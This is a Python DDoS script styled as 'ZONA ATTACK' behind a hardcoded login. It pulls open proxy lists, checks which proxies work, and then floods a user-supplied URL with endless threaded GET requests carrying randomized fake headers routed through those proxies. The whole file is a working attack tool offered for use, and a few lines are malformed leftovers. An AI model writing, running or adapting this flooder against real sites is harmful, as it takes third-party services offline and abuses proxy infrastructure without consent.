#!/usr/bin/python3
# -*- coding: utf-8  -*-
import requests as r, os, threading, random, click, fake_headers
from threading import Thread
import requests
from colorama import Fore, Style, Back
from fake_headers import Headers
import time

os.system("clear")
os.system("\033[33mhttps://github.com/kunfayz6-lab")
print("\033[33mWELCOME TO ZONA ATTACK SHIFFIN")
time.sleep(5)
print("\033[38;5;21mLoading.......")

attemps = 0
os.system("clear")
print("""
\033[38;5;57m╔═════════════════════════════════════════════════════════╗
\033[38;5;57m║\033[38;5;206m  
\033[38;5;57m║\033[38;5;206m████╗    ████╗
\033[38;5;57m║\033[38;5;206m█╔═══█║ █╔══█║
\033[38;5;57m║\033[38;5;206m█║    █║ █║    █║
\033[38;5;57m║\033[38;5;206m█║    █║ █║    █║
\033[38;5;57m║\033[38;5;206m█║   █║ █║   █║
\033[38;5;57m║\033[38;5;206m████║    ████║
\033[38;5;57m║\033[38;5;206m█╔═╝ █╔══█║
\033[38;5;57m║\033[38;5;206m╚╝    ╚╝    ╚╝
\033[38;5;57m║\033[38;5;206m
\033[38;5;57m╚═════════════════════════════════════════════════════════╝
""")    
while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[31mEnter your password: \033[0m")

    if username == 'qwertyu' and password == 'qwertyu':
        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

while threading.active_count()>150 :
    time.sleep(5)
Thread:{threading.get_ident()}
def __init__(self):
        print("init")
	
def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{}".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="File with a proxy")
@click.option('--url', '-u', help="URL")
def main(proxy, url):
	if url == None:
		url = input("URL: ")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
			array = req.text.split()
			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
